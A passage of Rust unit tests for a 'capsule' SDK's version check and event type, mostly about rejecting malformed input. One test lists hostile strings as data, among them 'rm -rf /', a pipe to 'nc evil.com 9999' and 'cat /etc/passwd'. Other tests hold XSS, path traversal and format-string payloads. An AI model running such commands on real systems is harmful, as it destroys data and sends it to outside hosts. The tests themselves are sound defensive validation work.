        assert_eq!(CAPSULE_REPLAY_START, "CAPSULE_REPLAY_START");
        assert_eq!(CAPSULE_VERDICT_REPRODUCED, "CAPSULE_VERDICT_REPRODUCED");
        assert_eq!(SDK_VERSION_CHECK, "SDK_VERSION_CHECK");
    }

    #[test]
    fn test_error_codes_defined() {
        assert_eq!(
            ERR_CAPSULE_SIGNATURE_INVALID,
            "ERR_CAPSULE_SIGNATURE_INVALID"
        );
        assert_eq!(ERR_CAPSULE_SCHEMA_MISMATCH, "ERR_CAPSULE_SCHEMA_MISMATCH");
        assert_eq!(ERR_CAPSULE_REPLAY_DIVERGED, "ERR_CAPSULE_REPLAY_DIVERGED");
        assert_eq!(ERR_CAPSULE_VERDICT_MISMATCH, "ERR_CAPSULE_VERDICT_MISMATCH");
        assert_eq!(ERR_SDK_VERSION_UNSUPPORTED, "ERR_SDK_VERSION_UNSUPPORTED");
        assert_eq!(ERR_CAPSULE_ACCESS_DENIED, "ERR_CAPSULE_ACCESS_DENIED");
    }

    #[test]
    fn test_invariant_codes_defined() {
        assert_eq!(INV_CAPSULE_STABLE_SCHEMA, "INV-CAPSULE-STABLE-SCHEMA");
        assert_eq!(INV_CAPSULE_VERSIONED_API, "INV-CAPSULE-VERSIONED-API");
        assert_eq!(
            INV_CAPSULE_NO_PRIVILEGED_ACCESS,
            "INV-CAPSULE-NO-PRIVILEGED-ACCESS"
        );
        assert_eq!(
            INV_CAPSULE_VERDICT_REPRODUCIBLE,
            "INV-CAPSULE-VERDICT-REPRODUCIBLE"
        );
    }

    #[test]
    fn test_sdk_event_new() {
        let evt = SdkEvent::new(CAPSULE_CREATED, "test capsule created");
        assert_eq!(evt.event_code, CAPSULE_CREATED);
        assert_eq!(evt.detail, "test capsule created");
    }

    #[test]
    fn test_sdk_event_clone() {
        let evt = SdkEvent::new(CAPSULE_SIGNED, "signed");
        let cloned = evt.clone();
        assert_eq!(cloned.event_code, evt.event_code);
        assert_eq!(cloned.detail, evt.detail);
    }

    #[test]
    fn test_sdk_event_debug() {
        let evt = SdkEvent::new(SDK_VERSION_CHECK, "version check");
        let debug = format!("{:?}", evt);
        assert!(debug.contains("SDK_VERSION_CHECK"));
    }

    // ── Negative-path tests for edge cases and invalid inputs ──────────

    #[test]
    fn negative_check_sdk_version_with_empty_and_whitespace_rejects() {
        // Empty version string should be rejected
        let result = check_sdk_version("");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
        assert!(err.contains("requested=, supported="));

        // Whitespace-only version should be rejected
        let result2 = check_sdk_version("   ");
        assert!(result2.is_err());
        let err2 = result2.unwrap_err();
        assert!(err2.contains(ERR_SDK_VERSION_UNSUPPORTED));

        // Tabs and newlines should be rejected
        let result3 = check_sdk_version("\t\n\r");
        assert!(result3.is_err());
        let err3 = result3.unwrap_err();
        assert!(err3.contains(ERR_SDK_VERSION_UNSUPPORTED));
    }

    #[test]
    fn negative_check_sdk_version_with_malformed_version_strings_rejects() {
        let invalid_versions = vec![
            "v1.0",            // Missing vsdk prefix
            "vsdk-v",          // Missing version number
            "vsdk-v1",         // Missing patch version
            "vsdk-v1.",        // Incomplete version
            "vsdk-v1.0.0",     // Too many version parts
            "VSDK-V1.0",       // Wrong case
            "vsdk-v1.0-beta",  // Pre-release suffix
            "vsdk-v1.0+build", // Build metadata
            "vsdk-v01.0",      // Leading zeros
            "vsdk-v-1.0",      // Negative version
        ];

        for version in invalid_versions {
            let result = check_sdk_version(version);
            assert!(result.is_err(), "Version '{}' should be rejected", version);
            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
            assert!(err.contains(&format!("requested={}", version)));
        }
    }

    #[test]
    fn negative_check_sdk_version_with_unicode_and_control_characters_rejects() {
        let problematic_versions = vec![
            "vsdk-v1\0.0",       // Null byte
            "vsdk-v1\x01.0",     // Control character
            "vsdk-v1🚀.0",       // Emoji
            "vsdk-v1\u{FFFF}.0", // Max BMP character
            "vsdk-v1.0\n",       // Trailing newline
            "\u{200B}vsdk-v1.0", // Zero-width space prefix
            "vsdk-v1.0\u{00A0}", // Non-breaking space suffix
        ];

        for version in problematic_versions {
            let result = check_sdk_version(version);
            assert!(result.is_err(), "Version '{}' should be rejected", version);
            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error message should safely contain the problematic version
            assert!(err.contains("requested="));
        }
    }

    #[test]
    fn negative_check_sdk_version_with_extremely_long_strings_handles_efficiently() {
        // Very long version string should be rejected efficiently
        let long_version = "vsdk-v1.0-".to_string() + &"x".repeat(100_000);

        let start_time = std::time::Instant::now();
        let result = check_sdk_version(&long_version);
        let duration = start_time.elapsed();

        assert!(result.is_err());

        // Should complete quickly despite long input (within 100ms)
        assert!(
            duration < std::time::Duration::from_millis(100),
            "Version check took too long: {:?}",
            duration
        );

        // Error message should truncate or handle long input safely
        let err = result.unwrap_err();
        assert!(
            err.len() < 200_000,
            "Error message should not be excessively long"
        );
    }

    #[test]
    fn negative_sdk_event_with_control_characters_and_large_details_handles_safely() {
        // Test SdkEvent with various problematic detail strings
        let problematic_details = vec![
            String::new(),                          // Empty detail
            "\0null\x01control\x7fchars".into(),    // Control characters
            "detail\nwith\nnewlines".into(),        // Multiline content
            "🚀🔥💀".into(),                        // Unicode emoji
            "\u{FFFF}\u{10FFFF}".into(),            // Max Unicode codepoints
            "x".repeat(10_000),                     // Very long detail
            "{\"malicious\": \"json\"}".into(),     // Potential JSON injection
            "<script>alert('xss')</script>".into(), // Potential XSS
            "../../etc/passwd".into(),              // Path traversal pattern
        ];

        for detail in problematic_details {
            let event = SdkEvent::new(CAPSULE_CREATED, detail.clone());

            // Event creation should succeed regardless of content
            assert_eq!(event.event_code, CAPSULE_CREATED);
            assert_eq!(event.detail, detail);

            // Debug formatting should not panic
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_CREATED"));

            // Clone should work with problematic content
            let cloned = event.clone();
            assert_eq!(cloned.detail, detail);
        }
    }

    #[test]
    fn negative_sdk_event_with_borrowed_string_types_converts_correctly() {
        // Test SdkEvent::new with various string-like types
        let string_owned = String::from("owned_string");
        let string_ref = "string_reference";
        let string_slice: &str = &string_owned[0..5]; // "owned"

        let event1 = SdkEvent::new(CAPSULE_SIGNED, string_owned.clone());
        let event2 = SdkEvent::new(CAPSULE_SIGNED, string_ref);
        let event3 = SdkEvent::new(CAPSULE_SIGNED, string_slice);

        assert_eq!(event1.detail, "owned_string");
        assert_eq!(event2.detail, "string_reference");
        assert_eq!(event3.detail, "owned");

        // Test with empty string slice
        let empty_slice: &str = &string_owned[0..0];
        let event4 = SdkEvent::new(CAPSULE_SIGNED, empty_slice);
        assert_eq!(event4.detail, "");
    }

    #[test]
    fn negative_version_check_error_message_formatting_with_special_characters() {
        // Test that error message formatting handles special characters safely
        let versions_with_format_specifiers = vec![
            "vsdk-%s",               // Printf format specifier
            "vsdk-{placeholder}",    // Rust format placeholder
            "vsdk-v1.0%",            // Percent character
            "vsdk-v1.0\\n",          // Escape sequences
            "vsdk-v1.0\"quoted\"",   // Quote characters
            "vsdk-v1.0'apostrophe'", // Apostrophe
        ];

        for version in versions_with_format_specifiers {
            let result = check_sdk_version(version);
            assert!(result.is_err());

            let err = result.unwrap_err();

            // Error should contain the expected format without interpretation
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
            assert!(err.contains(&format!("requested={}", version)));
            assert!(err.contains("supported=vsdk-v1.0"));

            // Error message should not interpret format specifiers
            assert!(!err.contains("(null)")); // Common printf error
            assert!(!err.contains("Error")); // Shouldn't expand placeholders
        }
    }

    #[test]
    fn negative_constants_immutability_and_correctness_verified() {
        // Verify that constants have expected values and cannot be modified

        // Version constants should be consistent
        assert_eq!(SDK_VERSION, "vsdk-v1.0");
        assert_eq!(SDK_VERSION_MIN, "vsdk-v1.0");
        assert!(SDK_VERSION.starts_with("vsdk-v"));
        assert!(SDK_VERSION_MIN.starts_with("vsdk-v"));

        // Security posture constants should be defined
        assert!(!STRUCTURAL_ONLY_SECURITY_POSTURE.is_empty());
        assert!(!STRUCTURAL_ONLY_RULE_ID.is_empty());
        assert!(STRUCTURAL_ONLY_SECURITY_POSTURE.contains("structural_only"));
        assert!(STRUCTURAL_ONLY_RULE_ID.contains("VERIFIER_SHORTCUT_GUARD"));

        // Event codes should follow expected patterns
        let event_codes = [
            CAPSULE_CREATED,
            CAPSULE_SIGNED,
            CAPSULE_REPLAY_START,
            CAPSULE_VERDICT_REPRODUCED,
            SDK_VERSION_CHECK,
        ];
        for code in &event_codes {
            assert!(!code.is_empty());
            assert!(code.is_ascii(), "Event code should be ASCII: {}", code);
        }

        // Error codes should follow ERR_ prefix pattern
        let error_codes = [
            ERR_CAPSULE_SIGNATURE_INVALID,
            ERR_CAPSULE_SCHEMA_MISMATCH,
            ERR_CAPSULE_REPLAY_DIVERGED,
            ERR_CAPSULE_VERDICT_MISMATCH,
            ERR_SDK_VERSION_UNSUPPORTED,
            ERR_CAPSULE_ACCESS_DENIED,
        ];
        for code in &error_codes {
            assert!(
                code.starts_with("ERR_"),
                "Error code should start with ERR_: {}",
                code
            );
            assert!(code.is_ascii(), "Error code should be ASCII: {}", code);
        }

        // Invariant codes should follow INV- prefix pattern
        let invariant_codes = [
            INV_CAPSULE_STABLE_SCHEMA,
            INV_CAPSULE_VERSIONED_API,
            INV_CAPSULE_NO_PRIVILEGED_ACCESS,
            INV_CAPSULE_VERDICT_REPRODUCIBLE,
        ];
        for code in &invariant_codes {
            assert!(
                code.starts_with("INV-"),
                "Invariant code should start with INV-: {}",
                code
            );
            assert!(
                code.contains("CAPSULE"),
                "Invariant should relate to capsules: {}",
                code
            );
        }
    }

    #[test]
    fn negative_memory_safety_with_recursive_string_construction() {
        // Test that SdkEvent and version checking don't cause memory issues
        // with potentially recursive or self-referential string construction

        let mut detail = String::from("base");

        // Build up a moderately complex string without excessive memory use
        for i in 0..100 {
            detail = format!("{}_{}", detail, i);

            let event = SdkEvent::new(CAPSULE_CREATED, detail.clone());
            assert_eq!(event.detail, detail);

            // Memory usage should be reasonable
            if detail.len() > 10_000 {
                break; // Prevent excessive test runtime
            }
        }

        // Final event should work with complex detail
        let final_event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, detail);
        assert!(!final_event.detail.is_empty());
        assert!(final_event.detail.contains("base"));
    }

    // ── Additional comprehensive negative-path tests ──

    #[test]
    fn negative_sdk_version_check_with_integer_overflow_patterns() {
        // Test version strings that could cause integer overflow in parsing
        let overflow_versions = vec![
            "vsdk-v18446744073709551615.0".to_string(), // u64::MAX
            "vsdk-v999999999999999999.0".to_string(),   // Large number
            "vsdk-v1.18446744073709551615".to_string(), // u64::MAX as minor
            "vsdk-v1.999999999999999999".to_string(),   // Large minor number
            "vsdk-v0.4294967295".to_string(),           // u32::MAX as minor
            format!("vsdk-v{}.0", i64::MAX),            // i64::MAX
            format!("vsdk-v{}.0", u128::MAX),           // u128::MAX (would be huge)
        ];

        for version in overflow_versions {
            let result = check_sdk_version(&version);
            assert!(
                result.is_err(),
                "Version with potential overflow should be rejected: {}",
                version
            );

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error message should be safely bounded even with large numbers
            assert!(
                err.len() < 1000,
                "Error message should not be excessively long for version: {}",
                version
            );
        }
    }

    #[test]
    fn negative_sdk_event_concurrent_access_stress_test() {
        // Test SdkEvent under concurrent access patterns (single-threaded simulation)
        use std::cell::RefCell;
        use std::rc::Rc;

        let shared_detail = Rc::new(RefCell::new(String::from("concurrent_test")));
        let mut events = Vec::new();

        // Simulate concurrent-like access patterns
        for i in 0..1000 {
            // Modify shared string
            {
                let mut detail = shared_detail.borrow_mut();
                detail.push_str(&format!("_{}", i % 10));
            }

            // Create event with snapshot of current state
            let detail_snapshot = shared_detail.borrow().clone();
            let event = SdkEvent::new(CAPSULE_CREATED, detail_snapshot.clone());

            assert_eq!(event.event_code, CAPSULE_CREATED);
            assert_eq!(event.detail, detail_snapshot);

            events.push(event);

            // Verify earlier events haven't been affected
            if i > 0 {
                let first_event = &events[0];
                assert_eq!(first_event.event_code, CAPSULE_CREATED);
                assert!(first_event.detail.starts_with("concurrent_test"));
            }
        }

        assert_eq!(events.len(), 1000);

        // Verify all events are independently stored
        for (_idx, event) in events.iter().enumerate() {
            assert!(event.detail.contains("concurrent_test"));
            let cloned = event.clone();
            assert_eq!(cloned.detail, event.detail);
        }
    }

    #[test]
    fn negative_version_check_with_null_byte_and_binary_data() {
        // Test version strings containing null bytes and binary data
        let binary_versions = vec![
            "vsdk-v1\x00.0".to_string(),              // Null byte in middle
            "\x00vsdk-v1.0".to_string(),              // Null byte at start
            "vsdk-v1.0\x00".to_string(),              // Null byte at end
            "vsdk-v1\u{FF}\u{FE}.0".to_string(),      // Binary data (BOM-like)
            "vsdk-v1.\u{80}\u{81}\u{82}".to_string(), // High-bit bytes
            String::from_utf8_lossy(&[118, 115, 100, 107, 45, 118, 49, 0, 46, 48]).into_owned(), // Null in UTF-8
        ];

        for version in binary_versions {
            let result = check_sdk_version(&version);
            assert!(
                result.is_err(),
                "Binary data version should be rejected: {:?}",
                version.as_bytes()
            );

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error should safely handle binary data in output
            assert!(err.contains("requested="));
            assert!(err.contains("supported=vsdk-v1.0"));
        }
    }

    #[test]
    fn negative_sdk_event_detail_with_extreme_unicode_edge_cases() {
        // Test SdkEvent with Unicode edge cases that could cause issues
        let unicode_edge_cases = vec![
            "\u{0}",                              // Null character as Unicode
            "\u{FFFF}",                           // Maximum BMP character
            "\u{10FFFF}",                         // Maximum Unicode codepoint
            r#"\uD800"#,                          // Raw string with high surrogate escape
            r#"\uDFFF"#,                          // Raw string with low surrogate escape
            "\u{1F4A9}\u{200D}\u{1F525}",         // Complex emoji sequence
            "\u{0301}\u{0302}\u{0303}",           // Combining characters only
            "a\u{0300}\u{0301}\u{0302}\u{0303}b", // Heavily accented character
            "\u{202E}reverse\u{202D}text",        // BiDi override characters
            "\u{FEFF}BOM\u{FEFF}marker",          // Byte order marks
        ];

        for (idx, detail) in unicode_edge_cases.into_iter().enumerate() {
            let event = SdkEvent::new(CAPSULE_SIGNED, detail);

            assert_eq!(event.event_code, CAPSULE_SIGNED);
            assert_eq!(event.detail, detail);

            // Debug output should be safe
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_SIGNED"));

            // Clone should preserve Unicode data exactly
            let cloned = event.clone();
            assert_eq!(cloned.detail.len(), detail.len());
            assert_eq!(cloned.detail, detail);

            // Converting to bytes and back should be stable
            let detail_bytes = event.detail.as_bytes();
            let roundtrip = String::from_utf8_lossy(detail_bytes);
            assert_eq!(
                roundtrip, detail,
                "Unicode roundtrip failed for case {}: {:?}",
                idx, detail
            );
        }
    }

    #[test]
    fn negative_version_string_with_path_traversal_injection_attempts() {
        // Test version strings that look like path traversal or injection attempts
        let injection_attempts = vec![
            "../vsdk-v1.0",                 // Path traversal up
            "vsdk-v1.0/../",                // Path traversal suffix
            "./vsdk-v1.0",                  // Current directory prefix
            "vsdk-v1.0/../../etc/passwd",   // Deep path traversal
            "file:///vsdk-v1.0",            // File URI scheme
            "http://evil.com/vsdk-v1.0",    // HTTP URL
            "$(echo vsdk-v1.0)",            // Command injection
            "`cat /etc/passwd`",            // Backtick injection
            "${USER}vsdk-v1.0",             // Variable expansion
            "vsdk-v1.0; rm -rf /",          // Command chaining
            "vsdk-v1.0 && echo pwned",      // Command AND
            "vsdk-v1.0 | nc evil.com 9999", // Pipe to netcat
            "vsdk-v1.0\nrm -rf /",          // Newline injection
        ];

        for injection in injection_attempts {
            let result = check_sdk_version(injection);
            assert!(
                result.is_err(),
                "Injection attempt should be rejected: {}",
                injection
            );

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
            assert!(err.contains(&format!("requested={}", injection)));

            // Error message should not execute or interpret the injection
            assert!(!err.contains("pwned"));
            assert!(!err.contains("etc/passwd"));

            // Should safely include the rejected input in error
            assert!(err.contains("supported=vsdk-v1.0"));
        }
    }

    #[test]
    fn negative_sdk_event_with_format_string_attack_patterns() {
        // Test SdkEvent with format string attack patterns
        let format_attacks = vec![
            "%s%s%s%s%s%s",          // Multiple format specs
            "%x%x%x%x%x%x%x",        // Hex dump attempts
            "%08x.%08x.%08x.%08x",   // Stack reading pattern
            "{}{}{}{}{}{}",          // Rust format braces
            "{0}{1}{2}{3}",          // Indexed format
            "%n%n%n%n%n",            // Write attempts (C)
            "\\x41\\x42\\x43",       // Hex escape sequences
            "\\u0041\\u0042\\u0043", // Unicode escapes
            "\\\\n\\\\t\\\\r",       // Escape sequence attempts
            "%p%p%p%p%p",            // Pointer dumping
        ];

        for pattern in format_attacks {
            let event = SdkEvent::new(CAPSULE_REPLAY_START, pattern);

            assert_eq!(event.event_code, CAPSULE_REPLAY_START);
            assert_eq!(event.detail, pattern); // Should be stored literally

            // Debug output should not interpret format specifiers
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_REPLAY_START"));
            assert!(!debug_output.contains("(null)")); // Common printf error
            assert!(!debug_output.contains("0x")); // Shouldn't expand hex

            // Clone should preserve attack string exactly
            let cloned = event.clone();
            assert_eq!(cloned.detail, pattern);

            // String should not be interpreted during any operations
            assert_eq!(cloned.detail.len(), pattern.len());
        }
    }

    #[test]
    fn negative_extreme_memory_pressure_simulation() {
        // Test behavior under simulated extreme memory pressure
        let mut large_events = Vec::new();
        let base_detail = "memory_pressure_test_".to_string();

        // Create progressively larger event details
        for i in 0..100 {
            let size_multiplier = 1 << (i % 10); // Powers of 2, cycling
            let large_detail = base_detail.repeat(size_multiplier);

            let event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, large_detail.clone());

            // Event should be created successfully
            assert_eq!(event.event_code, CAPSULE_VERDICT_REPRODUCED);
            assert_eq!(event.detail.len(), large_detail.len());

            large_events.push(event);

            // Break if we've created very large strings to avoid test timeouts
            if large_detail.len() > 100_000 {
                break;
            }
        }

        // Verify all events are still accessible and correct
        for (_idx, event) in large_events.iter().enumerate() {
            assert!(event.detail.starts_with("memory_pressure_test_"));
            assert_eq!(event.event_code, CAPSULE_VERDICT_REPRODUCED);

            // Clone should work even with large details
            let cloned = event.clone();
            assert_eq!(cloned.detail.len(), event.detail.len());
        }

        // Test version checking with large strings too
        let huge_version = "vsdk-v1.0-".to_string() + &"x".repeat(50_000);
        let result = check_sdk_version(&huge_version);
        assert!(result.is_err());

        let err = result.unwrap_err();
        assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
        // Should complete without hanging or crashing
    }

    #[test]
    fn negative_boundary_condition_testing_at_string_limits() {
        // Test boundary conditions around string size and content limits

        // Test with maximum reasonable event detail size
        let max_detail = "x".repeat(65536); // 64KB detail
        let max_event = SdkEvent::new(SDK_VERSION_CHECK, max_detail.clone());
        assert_eq!(max_event.detail.len(), 65536);
        assert_eq!(max_event.detail, max_detail);

        // Test empty strings
        let empty_event = SdkEvent::new(CAPSULE_CREATED, "");
        assert_eq!(empty_event.detail, "");
        assert!(empty_event.detail.is_empty());

        // Test single character
        let single_char_event = SdkEvent::new(CAPSULE_SIGNED, "x");
        assert_eq!(single_char_event.detail, "x");
        assert_eq!(single_char_event.detail.len(), 1);

        // Test version boundary conditions
        assert!(check_sdk_version("vsdk-v1.0").is_ok()); // Exact match
        assert!(check_sdk_version("vsdk-v1.1").is_err()); // Close but wrong
        assert!(check_sdk_version("vsdk-v0.9").is_err()); // Close but wrong
        assert!(check_sdk_version("vsdk-v").is_err()); // Missing version
        assert!(check_sdk_version("vsdk-").is_err()); // Missing v prefix
        assert!(check_sdk_version("sdk-v1.0").is_err()); // Missing vs prefix

        // Test boundary around supported version
        let slightly_off_versions = vec![
            "vsdk-v1.0 ",  // Trailing space
            " vsdk-v1.0",  // Leading space
            "vsdk-v1.0\0", // Null terminator
            "vsdk-v1.0\n", // Newline terminator
            "vsdk-v1.0\r", // Carriage return
            "vsdk-v1.0\t", // Tab character
        ];

        for version in slightly_off_versions {
            assert!(
                check_sdk_version(version).is_err(),
                "Slightly malformed version should be rejected: {:?}",
                version
            );
        }
    }

    // ── Extreme adversarial negative-path tests ──

    #[test]
    fn extreme_adversarial_unicode_bidirectional_override_injection_in_event_details() {
        // Extreme: Unicode bidirectional override attacks in event details
        let bidi_attack_patterns = vec![
            // Right-to-left override sequences that could manipulate display
            format!("normal{}evil{}", "\u{202E}", "\u{202D}"), // RLE + PDF
            format!("safe{}hidden{}visible", "\u{2066}", "\u{2069}"), // FSI + PDI
            format!("text{}rtl{}end", "\u{200F}", "\u{200E}"), // RLM + LRM
            format!("{}arabic{}", "\u{061C}", "\u{202C}"),     // ALM + PDF
            // Nested bidirectional overrides
            format!(
                "{}a{}b{}c{}",
                "\u{202E}", "\u{2066}", "\u{2069}", "\u{202D}"
            ),
            // Mixed with zero-width characters
            format!(
                "{}{}attack{}{}",
                "\u{202E}", "\u{200B}", "\u{200C}", "\u{202D}"
            ),
        ];

        for (_i, malicious_detail) in bidi_attack_patterns.iter().enumerate() {
            let event = SdkEvent::new(CAPSULE_CREATED, malicious_detail.clone());

            // Should store BiDi characters without interpretation or corruption
            assert_eq!(event.event_code, CAPSULE_CREATED);
            assert_eq!(event.detail, *malicious_detail);
            assert_eq!(event.detail.len(), malicious_detail.len());

            // BiDi characters should be preserved in debug output
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_CREATED"));

            // Should contain BiDi control characters (not be stripped)
            assert!(
                event.detail.contains('\u{202E}')
                    || event.detail.contains('\u{2066}')
                    || event.detail.contains('\u{200F}')
                    || event.detail.contains('\u{061C}'),
                "BiDi control characters should be preserved in detail"
            );

            // Clone should preserve exact BiDi sequence
            let cloned = event.clone();
            assert_eq!(cloned.detail.as_bytes(), malicious_detail.as_bytes());

            // Length calculations should handle BiDi correctly
            assert_eq!(
                cloned.detail.chars().count(),
                malicious_detail.chars().count()
            );
        }

        // Test version checking with BiDi injection
        let bidi_version = format!("{}vsdk-v1.0{}", "\u{202E}", "\u{202D}");
        let result = check_sdk_version(&bidi_version);
        assert!(result.is_err());

        let err = result.unwrap_err();
        assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
        assert!(err.contains(&bidi_version)); // Should include BiDi chars in error
    }

    #[test]
    fn extreme_adversarial_hash_collision_birthday_attack_on_event_codes() {
        // Extreme: Hash collision attacks against event code validation
        use std::collections::HashMap;

        // Generate event details designed to produce hash collisions
        let mut hash_collision_tracker = HashMap::new();
        let collision_candidates = 10000;

        for i in 0..collision_candidates {
            // Create event details with patterns likely to collide
            let collision_detail = format!(
                "collision_test_{}_{:016x}",
                i,
                i as u64 * 0x9e3779b97f4a7c15
            ); // Fibonacci hashing constant

            let event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, collision_detail.clone());

            // Verify event creation succeeds despite potential collisions
            assert_eq!(event.event_code, CAPSULE_VERDICT_REPRODUCED);
            assert_eq!(event.detail, collision_detail);

            // Track hash distribution (simplified hash for testing)
            let simple_hash = collision_detail
                .bytes()
                .fold(0u32, |acc, b| acc.wrapping_mul(31).wrapping_add(b as u32));

            *hash_collision_tracker
                .entry(simple_hash % 1000)
                .or_insert(0) += 1;

            // Test cloning under collision scenarios
            let cloned = event.clone();
            assert_eq!(cloned.detail, event.detail);
            assert_eq!(cloned.event_code, event.event_code);

            // Verify debug output remains stable under collision pressure
            if i % 1000 == 0 {
                let debug_output = format!("{:?}", event);
                assert!(debug_output.contains("CAPSULE_VERDICT_REPRODUCED"));
                assert!(debug_output.contains(&collision_detail));
            }
        }

        // Analyze collision distribution to ensure reasonable spread
        let bucket_count = hash_collision_tracker.len();
        assert!(
            bucket_count > 500,
            "Hash distribution should be reasonably spread: {} buckets",
            bucket_count
        );

        // Verify that high-collision buckets don't break the system
        let max_collisions = hash_collision_tracker.values().max().copied().unwrap_or(0);
        assert!(
            max_collisions < collision_candidates / 10,
            "Maximum collision count should be reasonable: {}",
            max_collisions
        );
    }

    #[test]
    fn extreme_adversarial_arithmetic_overflow_in_version_number_parsing() {
        // Extreme: Arithmetic overflow attacks during version parsing
        let overflow_version_patterns = vec![
            // Near integer overflow boundaries
            format!("vsdk-v{}.0", u64::MAX),
            format!("vsdk-v0.{}", u64::MAX),
            format!("vsdk-v{}.{}", u32::MAX, u32::MAX),
            format!("vsdk-v{}.{}", i64::MAX, i64::MAX),
            // Multiple overflow components
            format!("vsdk-v{}.{}.{}", u64::MAX, u64::MAX, u64::MAX),
            format!("vsdk-v{}.{}.{}.{}", u32::MAX, u32::MAX, u32::MAX, u32::MAX),
            // Potential wraparound values
            format!("vsdk-v{}.0", u32::MAX as u64 + 1),
            format!("vsdk-v0.{}", u32::MAX as u64 + 1),
            // Scientific notation overflow attempts
            "vsdk-v1e308.0".to_string(),
            "vsdk-v1.1e308".to_string(),
            "vsdk-v999999999999999999999999.0".to_string(),
            // Leading zeros that could cause octal interpretation
            format!("vsdk-v{:020}.0", 1), // Leading zeros
            format!("vsdk-v0.{:020}", 1),
        ];

        for overflow_version in overflow_version_patterns {
            let start_time = std::time::Instant::now();
            let result = check_sdk_version(&overflow_version);
            let duration = start_time.elapsed();

            // Should reject overflow versions quickly without arithmetic errors
            assert!(
                result.is_err(),
                "Overflow version should be rejected: {}",
                overflow_version
            );
            assert!(
                duration < std::time::Duration::from_millis(10),
                "Version check should complete quickly despite overflow: {:?}",
                duration
            );

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error message should be safely bounded despite large numbers
            assert!(
                err.len() < 500,
                "Error message should not be excessively long"
            );
            assert!(err.contains("requested="));
            assert!(err.contains("supported=vsdk-v1.0"));

            // Should not contain evidence of arithmetic overflow/wraparound
            assert!(!err.contains("overflow"));
            assert!(!err.contains("panic"));
        }

        // Test edge case: version that could cause saturation
        let saturation_version = format!(
            "vsdk-v{}.{}",
            std::u64::MAX.saturating_sub(1),
            std::u64::MAX.saturating_sub(1)
        );
        let result = check_sdk_version(&saturation_version);
        assert!(result.is_err());
    }

    #[test]
    fn extreme_adversarial_memory_exhaustion_via_recursive_event_nesting() {
        // Extreme: Memory exhaustion through nested event detail construction
        let base_pattern = "nested_event";
        let mut nested_detail = String::from(base_pattern);

        // Build deeply nested structure without infinite recursion
        for depth in 0..20 {
            // Create event at current nesting level
            let current_event = SdkEvent::new(CAPSULE_SIGNED, nested_detail.clone());

            // Verify event creation succeeds at each depth
            assert_eq!(current_event.event_code, CAPSULE_SIGNED);
            assert_eq!(current_event.detail, nested_detail);

            // Memory usage should remain bounded
            let memory_estimate = nested_detail.len() * std::mem::size_of::<char>();
            assert!(
                memory_estimate < 10_000_000, // 10MB limit
                "Memory usage should be bounded at depth {}: {} bytes",
                depth,
                memory_estimate
            );

            // Test cloning at each depth level
            let cloned = current_event.clone();
            assert_eq!(cloned.detail.len(), current_event.detail.len());

            // Debug output should remain stable despite nesting
            let debug_output = format!("{:?}", current_event);
            assert!(debug_output.contains("CAPSULE_SIGNED"));
            assert!(debug_output.len() < nested_detail.len() * 2); // Debug shouldn't explode

            // Increase nesting for next iteration
            nested_detail = format!("{}({})", nested_detail, nested_detail);

            // Break if detail becomes too large to prevent test timeouts
            if nested_detail.len() > 1_000_000 {
                break;
            }
        }

        // Verify system remains functional after memory pressure
        let post_pressure_event = SdkEvent::new(CAPSULE_CREATED, "post_pressure_test");
        assert_eq!(post_pressure_event.event_code, CAPSULE_CREATED);
        assert_eq!(post_pressure_event.detail, "post_pressure_test");
    }

    #[test]
    fn extreme_adversarial_timing_attack_via_version_string_complexity() {
        use std::time::Instant;

        // Extreme: Timing attacks based on version string processing complexity
        let complexity_test_cases = vec![
            // Simple baseline
            ("vsdk-v1.0".to_string(), "baseline"),
            // Repeated patterns that might stress string comparison
            ("vsdk-v1.0".to_owned() + &"x".repeat(1000), "long_suffix"),
            ("v".repeat(1000) + "sdk-v1.0", "long_prefix"),
            ("vs".repeat(500) + "dk-v1.0", "repeated_prefix"),
            // Patterns that might stress specific algorithms
            ("vsdk-".to_string() + &"a".repeat(1000), "no_version"),
            ("vsdk-v".to_string() + &"1".repeat(500), "repeated_digits"),
            ("vsdk-v1.".to_string() + &"0".repeat(500), "repeated_zeros"),
            // Unicode complexity
            ("vsdk-v1🚀.0🔥".to_string(), "unicode_emoji"),
            (
                "vsdk-v1".to_string() + &"\u{0300}".repeat(100) + ".0",
                "combining_chars",
            ),
            // Nested structure patterns
            ("vsdk-v".to_string() + &"(())".repeat(250), "nested_parens"),
            (
                "{".repeat(500) + "vsdk-v1.0" + &"}".repeat(500),
                "nested_braces",
            ),
        ];

        let mut timing_samples = std::collections::HashMap::new();
        let sample_count = 100;

        for (version, test_name) in &complexity_test_cases {
            let mut times = Vec::new();

            for _ in 0..sample_count {
                let start = Instant::now();
                let _result = check_sdk_version(version);
                let duration = start.elapsed();
                times.push(duration);

                // Each call should complete quickly regardless of complexity
                assert!(
                    duration < std::time::Duration::from_millis(10),
                    "Version check too slow for {}: {:?}",
                    test_name,
                    duration
                );
            }

            // Calculate statistics
            let avg_nanos: f64 =
                times.iter().map(|d| d.as_nanos() as f64).sum::<f64>() / sample_count as f64;

            let max_nanos = times.iter().map(|d| d.as_nanos()).max().unwrap() as f64;
            let min_nanos = times.iter().map(|d| d.as_nanos()).min().unwrap() as f64;

            timing_samples.insert(test_name, (avg_nanos, max_nanos, min_nanos));
        }

        // Analyze timing relationships to detect potential timing attacks
